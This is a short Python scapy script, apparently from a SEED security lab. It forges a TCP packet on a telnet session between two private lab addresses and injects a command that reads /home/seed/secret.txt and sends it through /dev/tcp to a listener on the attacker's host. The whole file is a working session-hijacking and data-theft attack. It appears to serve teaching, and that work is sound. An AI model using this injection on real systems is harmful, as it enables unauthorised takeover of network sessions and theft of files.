import sys
from scapy.all import *

IPLayer = IP(src = "10.0.2.4", dst = "10.0.2.15")
TCPLayer = TCP(sport=34486, dport=23, flags="A", seq=1271795704, ack=1815496943)

Data = "\r cat /home/seed/secret.txt > /dev/tcp/10.0.2.4/9090\r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt, verbose=0)